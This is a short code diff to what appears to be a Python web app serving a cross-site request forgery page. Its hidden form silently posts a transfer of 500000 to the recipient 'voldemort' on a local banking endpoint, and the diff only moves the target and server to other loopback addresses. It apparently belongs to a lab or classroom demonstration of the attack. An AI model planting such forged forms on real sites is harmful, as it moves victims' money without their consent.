@@ -7,7 +7,7 @@ texto = """
     <head>
     </head>
     <body>
-        <form action="http://localhost:2020/transferir" method="POST" id="hahahaha">
+        <form action="http://127.0.0.101:2020/transferir" method="POST" id="hahahaha">
             <input type="hidden" name="destinatario" value="voldemort" />
             <input type="hidden" name="valor" value="500000" />
         </form>
@@ -23,4 +23,4 @@ def entrada():
     return texto
 
 if __name__ == "__main__":
-    app.run(port = 2021)
+    app.run(port = 2021, host = "127.0.0.166")
